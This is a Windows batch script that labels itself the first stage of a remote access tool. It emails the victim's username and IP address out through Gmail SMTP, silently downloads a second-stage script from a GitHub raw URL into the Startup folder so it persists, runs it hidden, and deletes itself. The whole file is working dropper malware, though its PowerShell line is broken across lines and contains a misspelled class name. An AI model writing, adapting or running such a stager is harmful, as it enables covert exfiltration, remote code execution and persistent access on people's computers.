@echo off
REM initial stage for Remote access tool
REM created by Sulaxshayan

@REM variables 
set "INITIALPATH=%cd%"
set "STARTUP=C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

@REM move into startup directory
cd /d "%STARTUP%"

@REM setup smtp
powershell $email = "example@gmail.com"; $password = "password"; $ip = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias Ethernet0
).IPAddress | Out-String; $subject = "$env:UserName ip"; $smtp = New-Object System.Net.Mail.SmtpClient("smtp.gmail.com","587");
$smtp.EnableSSL = $true; $smtp.Credentials = New-Object System.Net.NetworkCredentials($email, $password); $smtp.Send($email, $email, $subject, $ip); 

@REM TODO: build out stage two 
@REM write payloads to startup 

powershell -windowstyle hidden -command "& {Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/NSulaxshayan/Malware_Analysis/main/files/wget.cmd' -OutFile 'wget.cmd'}"

@REM run payload 
powershell -windowstyle hidden -command "& {./wget.cmd}"

@REM cd back into initial location 
cd /d "%INITIALPATH%"
del initial.cmd 
